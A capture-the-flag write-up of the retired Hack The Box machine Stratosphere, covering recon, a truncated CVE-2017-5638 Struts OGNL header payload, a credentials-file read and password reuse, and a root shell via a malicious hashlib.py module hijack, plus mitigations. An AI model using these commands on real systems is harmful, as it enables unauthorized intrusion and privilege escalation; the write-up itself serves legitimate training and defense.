---
machine: Stratosphere
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, struts, cve-2017-5638, mysql, python-hijack]
---

# Stratosphere — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Apache Struts 2 at `/Monitoring/Welcome.action` is vulnerable to CVE-2017-5638: the `Content-Type` header is evaluated as OGNL. Execution as Tomcat leads to MySQL credentials and password reuse for `richard` over SSH. Escalation hijacks a Python module imported by a root-run script.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80,8080 <IP>
```

- SSH, Apache and Tomcat on 8080.
- `/Monitoring/Welcome.action` points to Struts.

## Enumeration

```bash
curl -s http://<IP>:8080/Monitoring/Welcome.action
searchsploit struts 2
```

The application is a credit monitor. The `.action` suffix and version confirm Struts 2.

## Foothold

```bash
curl -s http://<IP>:8080/Monitoring/Welcome.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#cmd='id')...}"
```

The OGNL payload runs commands as the Tomcat user. A `mkfifo` reverse shell provides a stable session.

## Lateral movement

```bash
cat /opt/tomcat/webapps/Monitoring/db_connect
mysql -u admin -p -e 'select * from users;'
```

MySQL credentials allow reading the `users` table; `richard`'s password is in clear text and reused for SSH.

## Privilege escalation

A root script imports a module from a writable directory. A malicious `hashlib.py` spawns a shell before the real import:

```bash
printf 'import os\nos.system("/bin/bash -p")\n' > /tmp/hashlib.py
sudo -u root /usr/local/bin/<script>
```

The resulting shell is root.

## Evidence

- `Welcome.action` and Struts version.
- `id` as the Tomcat user.
- Query against `users` with redacted credentials.
- `id` as root after the hijack.

## Lessons learned

- A mishandled `Content-Type` can become remote code execution.
- Password reuse turns a database read into lateral movement.
- `sys.path` and writable directories are module-hijack vectors.

## Mitigations and detection

- Update Struts and validate headers.
- Do not reuse passwords; use a secret manager.
- Run scripts with a clean `PYTHONPATH` and non-writable directories.
- Alert on OGNL payloads and imports from `/tmp`.

## References

- <https://www.hackthebox.com/machines/Stratosphere>
- <https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2017-5638>
- <https://attack.mitre.org/techniques/T1190/>
